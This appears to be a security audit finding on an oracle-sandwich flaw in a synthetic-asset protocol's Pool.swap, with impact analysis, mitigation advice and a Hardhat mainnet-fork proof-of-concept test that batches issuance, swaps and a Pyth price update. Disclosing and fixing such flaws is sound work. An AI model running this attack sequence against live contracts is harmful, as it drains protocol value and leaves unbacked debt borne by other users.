### Title
Oracle updates can be sandwiched between oracle-priced swaps to mint unbacked synths - (File: contracts/Pool.sol)

### Summary
`Pool.swap` prices exchanges with the current `IMasterOracle.quote` result and then burns/mints `SyntheticToken`s without correspondingly changing `DebtToken` balances. [1](#0-0) [2](#0-1) 

`Operator.execute` allows an attacker to execute an oracle-priced swap, a valid permissionless pull-oracle update, and the reverse swap in one ordered transaction while preserving the EOA as the protocol sender. [3](#0-2) [4](#0-3) 

### Finding Description
`Pool.swap` accepts only the input tokens and amount, with no deadline, output bound, oracle epoch, or maximum price-move parameter. [5](#0-4) 

After checking that the swap feature is active and that the attacker has enough input synths, it burns the input, obtains a fresh oracle quote, mints the fee to the fee collector, and mints the quoted output to the attacker. [6](#0-5) 

`quoteSwapOut` computes the output directly from `masterOracle().quote` and only subtracts the configured swap fee afterward. [7](#0-6) 

An attacker can first obtain synths by depositing collateral and calling `DebtToken.issue`; issuance checks the account using the pre-update oracle prices, mints the debt, and mints the synthetic asset. [8](#0-7) [9](#0-8) 

`Operator.execute` then permits the ordered sequence `issue -> swap(in,out) -> oracleUpdate -> swap(out,in)` in a single transaction; the update can also be front-run/back-run across consecutive transactions. [10](#0-9) 

For a fixed input-asset price, the round trip is profitable when `Pout_new / Pout_old > 1 / ((1 - feeInOut) * (1 - feeOutIn))`; the general condition uses the relative oracle rate before and after the update. [7](#0-6) 

Because `Pool.swap` invokes only `SyntheticToken.burn` and `SyntheticToken.mint`, the attacker’s original `DebtToken` obligation remains unchanged while the market value of the synthetic assets returned can exceed that debt. [2](#0-1) 

The same ordering can create bad debt when a collateral price falls: `DebtToken.issue` validates health against the old price, and a valid oracle update placed afterward leaves the position undercollateralized without any post-update health check. [11](#0-10) [12](#0-11) 

### Impact Explanation
A sufficiently large valid price update lets the attacker repay the initially issued synth debt and retain excess newly minted synths, leaving circulating synthetic value without matching debt collateralization. [2](#0-1) 

The collateral-price variant directly creates protocol bad debt because the borrowed synths are extracted before the collateral revaluation, while liquidation afterward can seize only the reduced collateral value. [13](#0-12) 

### Likelihood Explanation
No privileged Metronome role is required: the attacker only needs collateral or existing synths, two registered active synths, and a valid oracle update whose relative price change exceeds the swap and issuance fees. [14](#0-13) 

On deployments using publicly refreshable pull oracles, the attacker can place the update call directly inside `Operator.execute`; otherwise the same result can be achieved by front-running and back-running an observed oracle-update transaction. [10](#0-9) [15](#0-14) 

The `nonReentrant`, shutdown, synthetic-token-existence, and `SynthContext` checks do not prevent sequential calls, and issuance performs its health check before the later oracle update. [16](#0-15) [11](#0-10) 

### Recommendation
Use a two-step or commit-reveal swap flow so a swap cannot atomically consume prices on both sides of an oracle update. [17](#0-16) 

Apply gradual per-block price transitions or a short TWAP/median layer for mint, issue, liquidation, and swap quotes instead of instantly switching protocol valuation to a newly posted price. [7](#0-6) 

Add a mandatory oracle-update-first execution path or oracle epoch check for issuance and swaps where supported, recognizing that a user-controlled `amountOutMin` alone does not stop this protocol-level arbitrage. [11](#0-10) 

Set dynamic or minimum swap fees high enough to make expected oracle deviations unprofitable, and require a post-operation health evaluation for flows that combine collateral issuance with an oracle update. [18](#0-17) 

### Proof of Concept
The following Hardhat fork test sketches the attack against deployed contracts; the fork block and Pyth update data must be chosen so that the valid msETH price update exceeds the combined fees. [10](#0-9) 

```typescript
import {expect} from 'chai'
import {ethers} from 'hardhat'
import {parseEther, parseUnits} from '../helpers'
import {setTokenBalance} from './helpers'

it('sandwiches a valid oracle update between Pool.swap calls', async () => {
  // Attach deployed contracts from deployments/mainnet/*.json.
  const attacker = alice
  const collateralAmount = parseUnits('200000', 6)
  const debtAmount = parseEther('150000')

  await setTokenBalance(usdc.address, attacker.address, collateralAmount)
  await usdc.connect(attacker).approve(msdUSDC.address, collateralAmount)

  const issued = (await msUSDDebt.quoteIssueOut(debtAmount))[0]
  const ethOut = (await pool.quoteSwapOut(msUSD.address, msETH.address, issued))[0]

  // Valid signed update where msETH's oracle price rises sufficiently.
  const updateData = await pythAPI.getPriceFeedsUpdateData([MS_ETH_FEED_ID])
  const updateFee = await pyth.getUpdateFee([MS_ETH_FEED_ID])

  const calls = [
    {
      target: msdUSDC.address,
      value: 0,
      callData: msdUSDC.interface.encodeFunctionData('deposit', [
        collateralAmount,
        attacker.address,
      ]),
    },
    {
      target: msUSDDebt.address,
      value: 0,
      callData: msUSDDebt.interface.encodeFunctionData('issue', [
        debtAmount,
        attacker.address,
      ]),
    },
    {
      target: pool.address,
      value: 0,
      callData: pool.interface.encodeFunctionData('swap', [
        msUSD.address,
        msETH.address,
        issued,
      ]),
    },
    {
      target: pyth.address,
      value: updateFee,
      callData: pyth.interface.encodeFunctionData('updatePriceFeeds', [
        updateData,
      ]),
    },
    {
      target: pool.address,
      value: 0,
      callData: pool.interface.encodeFunctionData('swap', [
        msETH.address,
        msUSD.address,
        ethOut,
      ]),
    },
  ]

  await operator.connect(attacker).execute(calls, {value: updateFee})

  const debt = await msUSDDebt.balanceOf(attacker.address)
  const msUsdBalance = await msUSD.balanceOf(attacker.address)

  // The attacker can repay `debt` and retain `msUsdBalance - debt`.
  expect(msUsdBalance).to.be.gt(debt)
})
```
